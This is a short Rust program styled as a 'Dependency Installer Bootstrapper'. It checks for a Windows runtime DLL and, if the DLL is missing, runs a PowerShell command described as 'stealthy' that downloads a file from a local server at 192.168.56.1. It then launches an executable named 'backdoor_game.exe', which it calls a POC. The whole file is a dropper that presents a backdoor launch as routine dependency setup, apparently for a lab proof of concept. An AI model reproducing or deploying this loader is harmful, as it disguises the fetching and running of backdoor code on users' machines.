use std::process::Command;
use std::fs;
use std::path::Path;

fn main() {
    println!("[*] Starting Dependency Installer Bootstrapper...");

    // 1. Dependency Audit (Requirement 1)
    // Check if the Universal C Runtime (UCRT) base DLL exists.
    let ucrt_path = "C:\\Windows\\System32\\ucrtbase.dll";
    if !Path::new(ucrt_path).exists() {
        println!("[!] Missing dependency: Universal C Runtime (UCRT).");
        println!("[*] Downloading fix from local server...");

        // Use PowerShell for a stealthy/native download (Requirement 1)
        // Adjust the URL to your Arch Linux IP
        let arch_ip = "192.168.56.1";
        let download_cmd = format!(
            "(New-Object System.Net.WebClient).DownloadFile('http://{}:8080/kb2999226.msu', 'ucrt_fix.msu')",
            arch_ip
        );

        let status = Command::new("powershell")
            .args(&["-Command", &download_cmd])
            .status();

        match status {
            Ok(s) if s.success() => {
                println!("[+] Fix downloaded: ucrt_fix.msu");
                println!("[*] Manually install this file to fix the DLL error.");
            }
            _ => println!("[!] Download failed. Is the Python server running on Arch?"),
        }
    } else {
        println!("[+] Dependencies check passed.");
    }

    // 2. Launch the main POC if it exists
    if Path::new("backdoor_game.exe").exists() {
        println!("[*] Launching POC...");
        let _ = Command::new("backdoor_game.exe").spawn();
    } else {
        println!("[!] backdoor_game.exe not found in current directory.");
    }

    println!("[*] Bootstrapper finished. Closing in 5 seconds...");
    std::thread::sleep(std::time::Duration::from_secs(5));
}
